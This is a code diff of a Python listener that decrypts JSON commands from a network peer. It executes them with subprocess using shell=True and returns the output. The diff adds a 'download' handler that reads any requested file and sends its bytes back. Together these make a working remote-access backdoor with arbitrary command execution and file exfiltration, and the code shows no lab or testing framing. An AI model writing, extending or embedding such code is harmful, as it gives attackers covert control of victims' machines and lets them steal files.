@@ -1,3 +1,4 @@
+import os.path
 from time import sleep
 
 from listener.communication import Communication
@@ -36,16 +37,10 @@ def main():
         conn = listen["conn"]
         data = cipher.decrypt_message(listen["data"])
         data = json.loads(data)
-        print(data)
+
         if data is not None:
             print(data)
-            # response = json.dumps({
-            #     'command': 'download',
-            #     'params': "params"
-            # }).encode('utf-8')
-
-
-            if data['type'] == 'command':
+            if data['type'] == "command":
 
                 command = data['action']
                 result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -58,6 +53,23 @@ def main():
                 print(response)
 
                 conn.sendall(cipher.encrypt_message(response))
+
+            elif data['type'] == "download":
+                if not os.path.exists(data['action']):
+                    response = json.dumps({
+                        'status': 'NOK',
+                        'response': 'File not found'
+                    }).encode('utf-8')
+                else:
+                    file = open(data['action'], "rb")
+                    response = file.read()
+                    # response = json.dumps({
+                    #     'status': 'OK',
+                    #     'response': data
+                    # })
+                    file.close()
+                conn.sendall(cipher.encrypt_message(response))
+
 
             # response = cipher.encrypt_message(f"Commands received: {data['command']}")
             #conn.sendall(cipher.encrypt_message(response))
